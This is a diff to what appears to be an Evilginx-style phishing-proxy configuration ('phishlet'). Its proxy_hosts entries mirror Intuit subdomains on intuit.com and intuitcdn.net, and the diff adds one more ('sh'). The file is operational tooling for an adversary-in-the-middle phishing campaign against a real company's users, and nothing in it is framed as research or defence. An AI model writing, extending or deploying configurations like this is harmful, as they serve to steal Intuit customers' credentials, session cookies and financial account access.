@@ -10,7 +10,8 @@ proxy_hosts:
     - {phish_sub: 'intuitmarket', orig_sub: 'intuitmarket', domain: 'intuit.com', session: false, is_landing: false}
     - {phish_sub: 'appfabric-preload', orig_sub: 'appfabric-preload', domain: 'intuit.com', session: false, is_landing: false}	
     - {phish_sub: 'eventbus', orig_sub: 'eventbus', domain: 'intuit.com', session: false, is_landing: false}
-    - {phish_sub: 'rum', orig_sub: 'rum', domain: 'intuit.com', session: false, is_landing: false}    
+    - {phish_sub: 'rum', orig_sub: 'rum', domain: 'intuit.com', session: false, is_landing: false} 
+    - {phish_sub: 'sh', orig_sub: 'sh', domain: 'intuit.com', session: false, is_landing: false}     
     - {phish_sub: 'lib', orig_sub: 'lib', domain: 'intuitcdn.net', session: false, is_landing: false}
     - {phish_sub: 'plugin', orig_sub: 'plugin', domain: 'intuitcdn.net', session: false, is_landing: false}
     - {phish_sub: 'uxfabric', orig_sub: 'uxfabric', domain: 'intuitcdn.net', session: false, is_landing: false}
